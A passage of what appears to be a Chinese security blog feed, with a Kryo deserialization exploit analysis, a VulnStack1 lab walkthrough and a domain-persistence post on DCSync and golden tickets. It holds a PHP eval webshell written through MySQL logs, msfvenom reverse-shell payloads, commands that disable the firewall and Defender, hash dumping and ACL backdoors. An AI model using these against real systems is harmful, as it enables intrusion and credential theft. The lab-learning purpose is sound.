class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//这里不放url的key是为了序列化的时候不触发dns</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://bug2o1.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v2, <span class="number">0</span>, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeClassAndObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230924205706619.png" alt="image-20230924205706619"></p><p>这个exp比较特别的地方就是在这里了  第一次看的时候一脸懵逼  debug看了好一会才看明白</p><p><strong>(其实这里这个代码的目的就是为了给这个key赋值的   不是用这个put方法来进行赋值)</strong></p><p><img src="../images/image-20230924205908606.png" alt="image-20230924205908606"></p><p>这里的就是可以进行给key赋值</p><p><img src="../images/image-20230924210159859.png" alt="image-20230924210159859"></p><p>还有一点就是这个赋值这个地方  这里给table赋值的原因就是如果不适用<code>put</code>函数进行赋值的话  kryo在反序列化的时候就会中<code>table</code>数组中来获取这个<code>key</code></p><p><img src="../images/image-20230924210355699.png" alt="image-20230924210355699"></p><p><a href="https://xz.aliyun.com/t/9417#toc-2">在这篇文章中也讲到了这个table </a>   感兴趣的可以去看看’</p><p>那么这条链子就分析完了</p><h3 id="HotSwappableTargetSource"><a href="#HotSwappableTargetSource" class="headerlink" title="HotSwappableTargetSource"></a>HotSwappableTargetSource</h3><p> 关于这个类的话  熟悉这个rome链子的应该会知道  这链子在里面就有利用到</p><p>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HotSwappableTargetSource.equals-&gt;XString.equals-&gt;POJONode.toString-&gt;SignedObject.getObject-&gt;POJONode.toString-&gt;getOutputProperties</span><br></pre></td></tr></table></figure><p>在这个之前  我们得先去了解一下这个<code>equals</code>是怎么获取到的   </p><p><img src="../images/image-20230924213351886.png" alt="image-20230924213351886"></p><p>先下个断点</p><p><img src="../images/image-20230924214423583.png" alt="image-20230924214423583"></p><p>一般来说是进不去这个判断来触发这个<code>equals()</code>方法的  是会进去到上面的if判断里</p><p><img src="../images/image-20230924214637433.png" alt="image-20230924214637433"></p><p>进入到这个判断里的原因是因为这个key和value的值不相等  于是就会进入到这个判断里  因为我们是想要进入这个<code>equals()</code>里  所以我们要使其key和value的值相等</p><p>然后就会进入到<code>HotSwappableTargetSource</code>的<code>equals()</code>里  </p><p><img src="../images/image-20230924220303214.png" alt="image-20230924220303214"></p><p><img src="../images/image-20230924220317542.png" alt="image-20230924220317542"></p><p>这里这两个参数就是在刚开始的时候进行赋值</p><p>这就是为什么要初始化两个<code>HotSwappableTargetSource</code>的原因</p><p><img src="../images/image-20230924220411359.png" alt="image-20230924220411359"></p><p><strong>Xstring#equals()来触发这个pojoNode()</strong></p><p><img src="../images/image-20230924220959646.png" alt="image-20230924220959646"></p><p>后面的话就是正常的PojoNode的toString来触发了  老生常谈了  就不多说了</p><blockquote><p>可能在看的时候大家就有个疑问就是为什么要是使用两个PojoNode来  并且还是了signobject来进行二次反序列化    之所以这样做的原因是因为在最后触发这个getOutputProperties的时候  里面有个属性_tfactory是transient的  Kryo并不能对其进行反序列化</p></blockquote><p>在文章开头的时候写到  在序列化或者反序列化的时候  都会第一个触发<code>FiledSerializer</code>这个类  那么我们如果想要使用别的类怎么办？</p><p><img src="../images/image-20230925153313301.png" alt="image-20230925153313301"></p><p>这个这个Kryo的jar包力就有很多类可以使用</p><p><strong>用法如下</strong></p><p><img src="../images/15.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">        kryo.register(MyClass.class,<span class="keyword">new</span> <span class="title class_">BeanSerializer</span>(kryo, MyClass.class));</span><br><span class="line"></span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">        s.setNum(<span class="number">10</span>);</span><br><span class="line">        s.setHello(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readObject(input, MyClass.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在register这里就能指定了</p><p><img src="../images/image-20230925153806539.png" alt="image-20230925153806539"></p><p><img src="../images/image-20230925153827620.png" alt="image-20230925153827620"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在网上看文章得时候  无意中看到这个Kryo反序列化  于是就写这篇文章来学习一下&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://kaikaix.github.io/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&quot;</summary>
      
    
    
    
    
    <category term="Java" scheme="https://ke1nys.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>VulnStack1</title>
    <link href="https://ke1nys.github.io/posts/29edf1b0.html"/>
    <id>https://ke1nys.github.io/posts/29edf1b0.html</id>
    <published>2023-09-19T00:29:05.000Z</published>
    <updated>2023-09-25T07:41:06.426Z</updated>
    
    <content type="html"><![CDATA[<p>这里打这个靶机主要是为了学习一下MSF和CS的联动和使用 </p><p>搭建环境——-&gt;<a href="https://blog.csdn.net/weixin_39190897/article/details/118353886">参考文章</a></p><p>最终形成的 IP 划分情况如下：</p><div class="table-container"><table><thead><tr><th style="text-align:center">主机</th><th style="text-align:center">ip地址</th></tr></thead><tbody><tr><td style="text-align:center">Win11 物理机</td><td style="text-align:center">192.168.92.129</td></tr><tr><td style="text-align:center">Win7 外网服务器</td><td style="text-align:center">外网IP：192.168.92.128；内网IP：192.168.52.143</td></tr><tr><td style="text-align:center">Win2003 域成员主机</td><td style="text-align:center">内网IP：192.168.52.141</td></tr><tr><td style="text-align:center">Win 2008 域控主机</td><td style="text-align:center">内网IP：192.168.52.138</td></tr><tr><td style="text-align:center">kali(MSF)</td><td style="text-align:center">192.168.92.130</td></tr></tbody></table></div><p>这里的就搭建完成了</p><p>win7能ping通所有人  但是所有人ping不通win7  因为win7防火墙过滤了icmp</p><p>win2003和win2008能互相ping通</p><h2 id="外网打点getshell"><a href="#外网打点getshell" class="headerlink" title="外网打点getshell"></a>外网打点getshell</h2><p>就是访问外网服务器 </p><p><img src="../images/image-20230919084153968.png" alt="image-20230919084153968"></p><p>发现是一个php探针  如何发现下面存在一个mysql服务器的弱口令登录</p><p><img src="../images/image-20230919084258128.png" alt="image-20230919084258128"></p><blockquote><p>root/root</p></blockquote><p>然后开扫描  查找这个mysql管理后台</p><p><img src="../images/image-20230919084526500.png" alt="image-20230919084526500"></p><p>扫描发现存在phpmyadmin数据库管理后台   弱口令直接登录  <code>root/root</code></p><p><strong>phpmyadmin后台getshell的几种方法</strong></p><ul><li>select into outfile直接写入</li><li>开启全局日志getshell</li><li>使用慢查询日志getshell</li><li>使用错误日志getshell</li><li>利用PHPadmin4.8.x本地文件包含漏洞getshell</li></ul><p>这里<code>into outfile</code>使用不了  使用的时候提示报错</p><p><img src="../images/image-20230919085108292.png" alt="image-20230919085108292"></p><p>这个参数就是规定哪些路径可写的</p><p><img src="../images/image-20230919085245035.png" alt="image-20230919085245035"></p><p>说明了所有路径都不可写  于是尝试日志getshell  —-&gt;ctf常客了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;%general%&#x27; //查询日志是否开启  并且日志路径</span><br><span class="line">SET GLOBAL general_log=&#x27;on&#x27;  //将日志开启</span><br><span class="line">SET GLOBAL general_log_file=&#x27;C:/phpStudy/www/shell.php&#x27;  //设置日志路径</span><br><span class="line">SELECT &#x27;&lt;?php eval($_POST[&quot;1&quot;]);?&gt;&#x27;  //将马写入设置好的路径</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230919091138797.png" alt="image-20230919091138797"></p><p>成功进行写入 使用蚁剑进行连接</p><p>发现已经是管理员账户了  不过是本地的而已</p><p><img src="../images/image-20230919091429250.png" alt="image-20230919091429250"></p><h2 id="CS上线"><a href="#CS上线" class="headerlink" title="CS上线"></a>CS上线</h2><p>这里的话本来是想用msf的  结果老弹shell失败  说什么session无效  服了  所以就只能去弹cs了</p><p><img src="../images/image-20230919091621008.png" alt="image-20230919091621008"></p><p>服务器启动 </p><p>然后客户端连接</p><p><img src="../images/image-20230919091747685.png" alt="image-20230919091747685"></p><p>这个要自己设置好  就是服务端开启时的listener 要设置为自己的服务器地址  否则会失败</p><p><img src="../images/image-20230919091854502.png" alt="image-20230919091854502"></p><p>然后生成exe文件  通过蚁剑上传</p><p><img src="../images/image-20230919091947038.png" alt="image-20230919091947038"></p><p>执行后就可以在cs看到机器上线了</p><p><strong>(其实这里的话服务器应该时linux的 然后就开始对这个linux进行提权  然后开始域的信息收集了)</strong> ———-&gt;  通过蚁剑</p><p><img src="../images/image-20230919092359415.png" alt="image-20230919092359415"></p><p>然后wget传工具扫内网  挂隧道代理这样  不过影响不大  打这个靶机就是为了学习思路的</p><p>然后就是开始进行域的信息收集</p><blockquote><p>net view                 # 查看局域网内其他主机名<br>net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域<br>net user                 # 查看本机用户列表<br>net user /domain         # 查看域用户<br>net localgroup administrators # 查看本地管理员组（通常会有域用户）<br>net view /domain         # 查看有几个域<br>net user 用户名 /domain   # 获取指定域用户的信息<br>net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）<br>net group 组名 /domain    # 查看域中某工作组<br>net group “domain admins” /domain  # 查看域管理员的名字<br>net group “domain computers” /domain  # 查看域中的其他主机名<br>net group “domain controllers” /domain  # 查看域控制器主机名（可能有多台）</p></blockquote><p>在beacon下执行  前面要加上shell  蚁剑或者其他工具就不需要了</p><p>如果cs上线的话也是可以在beacon命令行执行的</p><p><img src="../images/image-20230919093559018.png" alt="image-20230919093559018"></p><p><img src="../images/image-20230919093642959.png" alt="image-20230919093642959"></p><p>点上面的那个瞄准按钮就能看到域内所有的主机了  </p><blockquote><p>192.168.52.143  ——&gt;是服务器内网地址</p><p>192.168.92.128 ———&gt; 是服务器外网地址</p><p>192.168.52.141 和 192.168.52.138  是内网域内主机 </p></blockquote><p>谁是域控主机还需要信息收集一下</p><p><img src="../images/image-20230919095712856.png" alt="image-20230919095712856"></p><p>OWA是域控主机  god.org是我们所处的域  那么上面的ROOT主机就是我们的普通域用户了</p><p>至此内网域信息搜集完毕，已经明确了域控主机为<code>192.168.52.138</code>，同时还存在另一台域成员<code>192.168.52.141</code>，接下来的目标就是横向渗透拿下域控！</p><h2 id="域内横向渗透"><a href="#域内横向渗透" class="headerlink" title="域内横向渗透"></a>域内横向渗透</h2><p>接下来将通过 Win7 跳板机(<strong>就是通过让服务器为跳板机</strong>)，横向渗透拿下内网域内的域成员主机和域控主机。</p><p>这里的话先让靶机弹一个<code>meterpreter</code>先    这里因为咱们的目标机器是 <code>windows</code></p><blockquote><p>use exploit/multi/handler</p><p>set payload windows/x64/meterpreter/reverse_tcp  //这里的话是看情况来定</p><p>set lhost xx.xx.xx.xx</p><p>set lport 1234</p><p>run</p></blockquote><p>然后生成exe文件  通过蚁剑进行上传到windows服务器上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.92.130 LPORT=1234 -f exe -o 3.exe</span><br></pre></td></tr></table></figure><p>然后蚁剑 ——&gt;  <code>start 3.exe</code>  开始运行  这边msf就上线了</p><p><img src="../images/image-20230919150750372.png" alt="image-20230919150750372"></p><p>上线成功</p><p>老样子知道了域内一共是存在两个机器   一个是域控主机  一个是普通用户 都是windows</p><h3 id="MSF简单模块的使用"><a href="#MSF简单模块的使用" class="headerlink" title="MSF简单模块的使用"></a>MSF简单模块的使用</h3><p>获得 MSF 的会话后即可使用 MSF 集成的诸多强大功能模块和脚本。简单演示下，如调用<code>post/windows/gather/checkvm</code>判断靶机是否属于虚拟机（检查是否进入了蜜罐）：</p><p><img src="../images/image-20230919151037655.png" alt="image-20230919151037655"></p><p>再如调用 <code>post/windows/gather/enum_applications</code>模块枚举列出安装在靶机上的应用程序：</p><p><img src="../images/image-20230919151116220.png" alt="image-20230919151116220"></p><p>这是收集的一些常用的模块</p><blockquote><p>run post/windows/gather/enum_logged_on_users        #查看登录过的用户信息</p><p>run post/windows/gather/enum_ad_groups        #查看组信息</p><p>run post/windows/gather/enum_domain        #定位域控</p><p>run post/windows/gather/enum_ad_computers        #域内所有机器</p><p>use post/windows/gather/enum_patches        #发现安装的补丁</p><p>use post/multi/recon/local_exploit_suggester        #快速识别可能被利用的漏洞</p><p>run post/windows/manage/migrate           #自动进程迁移<br> run post/windows/gather/checkvm           #查看目标主机是否运行在虚拟机上<br> run post/windows/manage/killav            #关闭杀毒软件<br> run post/windows/manage/enable_rdp        #开启远程桌面服务<br> run post/windows/manage/autoroute         #查看路由信息<br> run post/windows/gather/enum_logged_on_users    #列举当前登录的用户<br> run post/windows/gather/enum_applications       #列举应用程序<br> run post/windows/gather/credentials/windows_autologin                #抓取自动登录的用户名和密码<br> run post/windows/gather/smart_hashdump               #dump出所有用户的hash</p></blockquote><p>下次上线msf后可以进行使用</p><h3 id="MSF进行永恒之蓝攻击"><a href="#MSF进行永恒之蓝攻击" class="headerlink" title="MSF进行永恒之蓝攻击"></a>MSF进行永恒之蓝攻击</h3><p><img src="../images/image-20230919152043056.png" alt="image-20230919152043056"></p><p>发现一共是打了这些补丁  没有打永恒之蓝的补丁  于是我们就可以进行攻击  先是来查看两个主机的端口开放了没有</p><h4 id="静态路由配置"><a href="#静态路由配置" class="headerlink" title="静态路由配置"></a><strong>静态路由配置</strong></h4><p>MSF 的 autoroute 模块是 MSF 框架中自带的一个路由转发功能，实现过程是 MSF 框架在已经获取的 Meterpreter Shell 的基础上添加一条去往“内网”的路由，直接使用 MSF 去访问原本不能直接访问的内网资源，只要路由可达我们既可使用 MSF 来进行探测了</p><p><strong>首先需要使用配置静态路由：</strong></p><blockquote><h1 id="加载MSF的autoroute模块，获取当前机器的所有网段信息"><a href="#加载MSF的autoroute模块，获取当前机器的所有网段信息" class="headerlink" title="加载MSF的autoroute模块，获取当前机器的所有网段信息"></a>加载MSF的autoroute模块，获取当前机器的所有网段信息</h1><p>meterpreter &gt; run post/multi/manage/autoroute  </p><h1 id="添加目标内网路由"><a href="#添加目标内网路由" class="headerlink" title="添加目标内网路由"></a>添加目标内网路由</h1><p>meterpreter &gt; run post/multi/manage/autoroute SUBNET=192.168.52.0 ACTION=ADD</p><p>//这里填这个52段是因为这个 内网地址就是这个段的</p><p>//这里可能会失败  不过影响不大  因为这个错误说明的是已经配置好了</p></blockquote><p><img src="../images/image-20230919152522487.png" alt="image-20230919152522487"></p><p>下面那步失败就是因为第一步的时候已经添加进去了</p><h4 id="MSF内网端口扫描"><a href="#MSF内网端口扫描" class="headerlink" title="MSF内网端口扫描"></a><strong>MSF内网端口扫描</strong></h4><p>现在路由可达内网网段，可以先对内网主机进行探测。</p><p>1、先执行background 命令将当前执行的 Meterpreter 会话切换到后台（后续也可执行sessions -i 重新返回会话），然后使用 MSF 自带 <code>auxiliary/scanner/portscan/tcp</code> 模块扫描内网域成员主机 <code>192.168.52.141</code> 开放的端口：</p><blockquote><p>msf6 &gt; use auxiliary/scanner/portscan/tcp </p><p>msf6 &gt; set rhosts 192.168.52.141</p><p> msf6 &gt; set ports 80,135-139,445,3306,3389</p><p> msf6 &gt; run</p></blockquote><p><img src="../images/image-20230919152813739.png" alt="image-20230919152813739"></p><p>发现开启了445端口  于是就是去尝试是否存在永恒之蓝的这个漏洞</p><h4 id="利用ms17-010进行攻击"><a href="#利用ms17-010进行攻击" class="headerlink" title="利用ms17-010进行攻击"></a><strong>利用ms17-010进行攻击</strong></h4><p>对于开启了 445 端口的 Windows 服务器，肯定是要进行一波永恒之蓝扫描尝试的，借助 MSF 自带的漏洞扫描模块进行扫描：</p><blockquote><p>msf6 &gt; search ms17_010 #搜索MSF集成的与ms17_010漏洞相关的模块<br>msf6 &gt;use auxiliary/scanner/smb/smb_ms17_010 # 加载扫描exp<br>msf6 &gt;set rhosts 192.168.52.141 #设置被扫描的主机IP<br>msf6 &gt;run  #进行扫描，观察是否存在该漏洞</p></blockquote><p><img src="../images/image-20230919153204857.png" alt="image-20230919153204857"></p><p>同理  域控主机也是存在的</p><p>这里讲一个关闭这个防火墙和杀毒的方法</p><blockquote><p>meterpreter  —-&gt;  shell</p><p>netsh advfirewall set allprofiles state off <em>#关闭防火墙</em> </p><p>net stop windefend <em>#关闭Windows defender</em></p></blockquote><h4 id="MSF开启远程桌面"><a href="#MSF开启远程桌面" class="headerlink" title="MSF开启远程桌面"></a>MSF开启远程桌面</h4><blockquote><p>run post/windows/manage/enable_rdp</p></blockquote><p>这个指令能开启我们的跳板机的3389端口</p><p>这里的话不想往下写了   主要的目的就是为了了解一下这些工具的使用</p><p>这个靶机以后可以拿来测试一下  学到的方法</p><p><a href="https://blog.csdn.net/weixin_45588247/article/details/119497964">MSF中mimikatz的使用方法</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里打这个靶机主要是为了学习一下MSF和CS的联动和使用 &lt;/p&gt;
&lt;p&gt;搭建环境——-&amp;gt;&lt;a href=&quot;https://blog.csdn.net/weixin_39190897/article/details/118353886&quot;&gt;参考文章&lt;/a&gt;&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Windows域-权限维持</title>
    <link href="https://ke1nys.github.io/posts/a3cbb047.html"/>
    <id>https://ke1nys.github.io/posts/a3cbb047.html</id>
    <published>2023-09-17T08:24:08.000Z</published>
    <updated>2023-09-26T06:51:42.687Z</updated>
    
    <content type="html"><![CDATA[<p>这里的使用这个的前提就是已经拿下域控了  并且拿下管理员账户了</p><p>为了防止蓝队把我们踢出局  所以执行这个是必要的</p><h2 id="DC-Sync"><a href="#DC-Sync" class="headerlink" title="DC Sync"></a>DC Sync</h2><p><a href="https://blog.csdn.net/qq_44159028/article/details/124274233">参考文章</a></p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>DCSync是<a href="https://so.csdn.net/so/search?q=mimikatz&amp;spm=1001.2101.3001.7020">mimikatz</a>的一个功能，能够模拟域控制器并从域控制器导出帐户密码hash</p><p>在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。</p><p>DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。</p><p>新版本的 Mimikatz新增加了 DCSync 功能。该功能可以模仿一个域控制器，从真实的域控制器中请求数据，例如用户的哈希。该功能最大的特点就是可以实现不登录到域控而获取域控上的数据</p><p><strong>当获得了域内管理员权限，如果能修改域内普通用户的权限，使其具有DCSync权限的话，那么普通域用户也能导出域内用户的哈希，这样可以做一个隐蔽的权限维持</strong>。默认只有域控主机账号和域管理员能Dcsync，域管和邮件服务器的机器账号有写ACL的权限，可以给指定用户添加Dcsync来dump域哈希。</p><h3 id="利用-导出hash"><a href="#利用-导出hash" class="headerlink" title="利用(导出hash)"></a>利用(导出hash)</h3><p>导出域用户hash，需获取以下任意用户的权限：</p><ul><li>Administrators组内的用户</li><li>Domain Admins组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p><img src="../images/image-20230917163932351.png" alt="image-20230917163932351"></p><p><strong>四个用户的简介</strong></p><p>在我们拿下这个域控之后  我们就可以dump全部人的hash值了</p><p><img src="../images/image-20230917164100983.png" alt="image-20230917164100983"></p><p>这里是获取krbtgt的hash值  如果想要获取全部人的hash值得话</p><p><img src="../images/image-20230917164209206.png" alt="image-20230917164209206"></p><p>dump所有人得hash值  并且以csv的格式进行输出</p><p>其实在这里的话我们是可以在获取这个krbtgt的hash值情况下   进行创建黄金票据来注入内存  来使这台计算机具有管理员权限  这里的话就使用别的方法</p><h3 id="维持-给别的计算机添加管理员权限"><a href="#维持-给别的计算机添加管理员权限" class="headerlink" title="维持(给别的计算机添加管理员权限)"></a>维持(给别的计算机添加管理员权限)</h3><p>DCsync是几个权限的集合体，如果使其具有DCSync权限的话，可以使用powerview.ps1向域内普通用户添加如下三条ACE(Access Control Entries)：</p><p><img src="../images/image-20230917164909007.png" alt="image-20230917164909007"></p><p>在域管用户的机器上执行 给别的机器上的普通用户yuwin7添加以上三条ACE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#添加ACE</span><br><span class="line">powershell -exec bypass</span><br><span class="line">import-module .\PowerView.ps1;Add-DomainObjectAcl -TargetIdentity “DC=test,DC=lab” -PrincipalIdentity yuwin7 -Rights DCSync -Verbose</span><br><span class="line"> </span><br><span class="line">#使用完后可以删除ACE</span><br><span class="line">Remove-DomainObjectAcl -TargetIdentity “DC=test,DC=lab” -PrincipalIdentity yuwin7 -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure><p>这里的话普通用户yuwin7就能执行管理员权限还dump出所有人的hash值了</p><h2 id="黄金票据和白银票据"><a href="#黄金票据和白银票据" class="headerlink" title="黄金票据和白银票据"></a>黄金票据和白银票据</h2><p><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/#%E9%93%B6%E7%A5%A8-SilverTickets">参考文章</a></p><p>其实这里的话在之前的几个模块就已经写过了  但是为了加深印象和总结  就重新在写一遍  加深印象</p><p><strong>在学习这两个协议之前  可以先去看看我之前写的一篇这个关于 <a href="https://ke1nys.github.io/posts/1bedf17b.html">Kerberos</a>协议的文章</strong></p><p>学习这个的前提还是得先了解<code>kerberos</code>协议的身份验证流程</p><p><img src="../images/d8b0bf2303eb0486da1737ac6a07da51.png" alt="img"></p><p><strong>然后了解一下会用到的东西</strong></p><ul><li><strong>KDC</strong>(Key Distribution Center)： 密钥分发中心，里面包含两个服务：AS和TGS</li><li><strong>AS</strong>(Authentication Server)： 身份认证服务</li><li><strong>TGS</strong>(Ticket Granting Server)： 票据授予服务</li><li><strong>TGT</strong>(Ticket Granting Ticket): 由身份认证服务授予的票据，用于身份认证，存储在内存，默认有效期为10小时</li><li><strong>Pass The Ticket</strong>： 如果我们能够拿到用户的TGT，并将其导入到内存，就可以冒充该用户获得其访问权限</li></ul><p>这里的话就不多介绍了  因为在上面给了一篇文章详细的讲了这个流程</p><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>黄金门票是伪造的TGT。这意味着我们绕过上图的步骤 1 和 2，在那里我们向 DC 证明我们是谁  <strong>可以说有了金票就有了域内的最高权限</strong></p><p> 每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，其实就可以伪造任意用户的TICKET,</p><p> 对于攻击者来说，实际上只要拿到了域控权限，就可以直接导出krbtgt的Hash值，，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket。</p><p><img src="../images/2016011804523676070160.png" alt="Alt text"></p><p>这就是黄金票据和白银票据的生成过程</p><h4 id="黄金票据特点"><a href="#黄金票据特点" class="headerlink" title="黄金票据特点"></a>黄金票据特点</h4><ul><li>域控制器中的KDC服务不验证TGT中的用户帐户，直到<a href="http://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html">TGT超过20分钟，</a>这意味着攻击者可以使用禁用和删除的帐户，甚至是在Active Directory中不存在的虚拟帐户。</li></ul><blockquote><p>简单点说就是我们绕过了KDC来创建TGT了  但是KDC会验证我们TGT票据里的用户是否有效  证明有效的前提就是该用户的时间戳不超过20分钟 (未被禁用、删除或不存在——-&gt; 